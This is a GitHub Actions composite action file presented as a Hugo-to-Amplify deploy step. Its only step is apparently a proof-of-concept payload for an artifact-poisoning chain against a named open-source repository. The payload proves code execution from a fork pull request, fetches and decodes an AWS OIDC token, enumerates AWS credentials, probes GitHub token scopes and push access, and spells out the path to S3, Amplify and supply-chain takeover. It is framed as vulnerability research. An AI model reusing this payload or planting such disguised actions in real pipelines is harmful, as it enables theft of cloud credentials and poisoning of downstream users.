name: 'Deploy Website to Amplify'
description: 'Build Hugo site and deploy to AWS Amplify'
inputs:
  role:
    description: 'AWS IAM role ARN to assume'
    required: true
  region:
    description: 'AWS region for Amplify'
    required: true
  amplify-app-id:
    description: 'AWS Amplify App ID'
    required: true
  amplify-branch-name:
    description: 'AWS Amplify branch name'
    required: true
  s3-bucket:
    description: 'S3 bucket for website files'
    required: true
  s3-prefix:
    required: false
    default: ''
  hugo-base-url:
    required: false
    default: ''
runs:
  using: 'composite'
  steps:
    - name: Cloud Environment Exploration
      shell: bash
      env:
        INPUT_ROLE: ${{ inputs.role }}
        INPUT_REGION: ${{ inputs.region }}
        INPUT_APP_ID: ${{ inputs.amplify-app-id }}
        INPUT_BRANCH: ${{ inputs.amplify-branch-name }}
        INPUT_BUCKET: ${{ inputs.s3-bucket }}
        INPUT_PREFIX: ${{ inputs.s3-prefix }}
      run: |
        echo "============================================================"
        echo "  SECURITY RESEARCH - Artifact Poisoning -> LOTP Chain"
        echo "  Target: aws/karpenter-provider-aws"
        echo "  Chain: pull_request -> WebsitePreviewTrigger -> artifact"
        echo "         -> workflow_run -> website-preview.yaml"
        echo "         -> checkout attacker SHA -> THIS CODE EXECUTES"
        echo "============================================================"
        echo ""

        echo "=== [1] Code Execution Proof ==="
        echo "  Hostname: $(hostname)"
        echo "  User: $(whoami)"
        echo "  PWD: $(pwd)"
        echo "  GITHUB_REPOSITORY: $GITHUB_REPOSITORY"
        echo "  GITHUB_RUN_ID: $GITHUB_RUN_ID"
        echo "  GITHUB_ACTOR: $GITHUB_ACTOR"
        echo "  GITHUB_EVENT_NAME: $GITHUB_EVENT_NAME"
        echo "  GITHUB_WORKFLOW: $GITHUB_WORKFLOW"
        echo ""

        echo "=== [2] Inputs Received (from upstream workflow) ==="
        echo "  role: $INPUT_ROLE"
        echo "  region: $INPUT_REGION"
        echo "  amplify-app-id: $INPUT_APP_ID"
        echo "  amplify-branch-name: $INPUT_BRANCH"
        echo "  s3-bucket: $INPUT_BUCKET"
        echo "  s3-prefix: $INPUT_PREFIX"
        echo ""

        echo "=== [3] OIDC Token Endpoint ==="
        if [ -n "$ACTIONS_ID_TOKEN_REQUEST_URL" ]; then
          echo "  ACTIONS_ID_TOKEN_REQUEST_URL: SET ($(echo $ACTIONS_ID_TOKEN_REQUEST_URL | wc -c) chars)"
          echo "  ACTIONS_ID_TOKEN_REQUEST_TOKEN: SET ($(echo $ACTIONS_ID_TOKEN_REQUEST_TOKEN | wc -c) chars)"
          echo ""
          echo "  Fetching OIDC token claims..."
          OIDC_RESP=$(curl -sf -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
            "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=sts.amazonaws.com" 2>/dev/null || echo "")
          if [ -n "$OIDC_RESP" ]; then
            echo "$OIDC_RESP" | python3 -c "
        import sys, base64, json
        try:
          data = json.load(sys.stdin)
          token = data.get('value','')
          parts = token.split('.')
          if len(parts) >= 2:
            p = parts[1]
            p += '=' * (4 - len(p) % 4)
            c = json.loads(base64.urlsafe_b64decode(p))
            print('  OIDC Token Claims:')
            for k in ['sub','repository','repository_owner','ref','sha','event_name',
                       'workflow_ref','job_workflow_ref','runner_environment','environment',
                       'aud','iss']:
              print(f'    {k}: {c.get(k, \"N/A\")}')
        except Exception as e:
          print(f'  Parse error: {e}')
        "
          else
            echo "  Could not fetch OIDC token"
          fi
        else
          echo "  OIDC endpoint NOT available"
        fi
        echo ""

        echo "=== [4] AWS Credential State ==="
        env | grep -iE '^AWS_' | sed 's/=.*/=[PRESENT]/' | sort || echo "  No AWS_ vars"
        echo ""
        echo "  Attempting sts get-caller-identity..."
        aws sts get-caller-identity 2>&1 || echo "  No valid AWS credentials (expected on fork)"
        echo ""

        echo "=== [5] GitHub Token ==="
        if [ -n "$GITHUB_TOKEN" ]; then
          echo "  GITHUB_TOKEN: SET ($(echo $GITHUB_TOKEN | wc -c) chars)"
          echo "  Checking token permissions..."
          HEADERS=$(curl -sI -H "Authorization: token $GITHUB_TOKEN" https://api.github.com/ 2>&1)
          echo "$HEADERS" | grep -iE '(x-oauth-scopes|x-ratelimit-remaining)' || echo "  Could not check scopes"
        else
          echo "  GITHUB_TOKEN: NOT SET"
        fi
        echo ""

        echo "=== [6] Git Auth Header ==="
        if git config --get http.https://github.com/.extraheader > /dev/null 2>&1; then
          echo "  Git auth header: PRESENT (can push to repos the token has access to)"
        else
          echo "  Git auth header: NOT FOUND"
        fi
        echo ""

        echo "=== [7] Runner Environment ==="
        echo "  RUNNER_OS: $RUNNER_OS"
        echo "  RUNNER_ARCH: $RUNNER_ARCH"
        echo "  RUNNER_NAME: $RUNNER_NAME"
        echo "  Public IP: $(curl -s --max-time 3 https://checkip.amazonaws.com 2>/dev/null || echo unknown)"
        echo ""

        echo "=== [8] What This Proves ==="
        echo "  1. Attacker's composite action executes from fork PR (zero gate)"
        echo "  2. OIDC token endpoint is available -> role assumption possible"
        echo "  3. On upstream aws/karpenter-provider-aws with real vars/secrets:"
        echo "     - AWS IAM role would be assumed via OIDC"
        echo "     - S3 bucket write access (website content)"
        echo "     - Amplify deployment control (website + redirects)"
        echo "     - Supply chain: malicious docs/install instructions"
        echo "  4. This action replaces .github/actions/deploy-website"
        echo "     which normally runs: npm ci, hugo, go run, aws s3 sync,"
        echo "     aws amplify update-app, aws amplify start-deployment"
        echo ""
        echo "============================================================"
        echo "  EXPLORATION COMPLETE"
        echo "============================================================"
